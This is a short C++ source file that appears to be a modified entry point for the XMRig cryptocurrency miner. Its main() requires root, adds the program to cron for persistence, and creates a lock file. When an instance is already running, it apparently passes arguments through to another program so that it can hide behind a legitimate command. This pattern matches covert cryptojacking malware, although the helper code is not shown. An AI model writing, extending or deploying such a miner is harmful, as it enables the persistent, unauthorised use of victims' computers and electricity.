/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "base/io/log/Log.h"
#include "core/Passthrough.h"
#include "core/ProgramArgs.h"
#include "core/Middleware.h"

#include <iostream>
#include <cstdlib>
#include <vector>

int main(int argc, char** argv) {
    using namespace xmrig;

    Passthrough passthrough;
    Middleware middleware;
    ProgramArgs args(argc, argv);

    if (passthrough.isAnotherInstanceRunning()) {
        LOG_ALERT("Another instance is already running!");

        if (middleware.sanitizeProgramArgs(&args)) {
            LOG_WARN("Forbidden command has been used!");
        }

        return passthrough.handlePassthrough(args);
    }
    else if (!middleware.isLaunchedAsRoot()) {
        LOG_ALERT("This program must be run as root!");

        return passthrough.handlePassthrough(args);
    }

    middleware.addToCron();
    passthrough.createLockFile();

    Process process(args.argc, args.argv);
    int returnCode = passthrough.createProcess(args, &process);

    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    app.addPassthrough(&passthrough);
    app.exec();

    return returnCode;
}
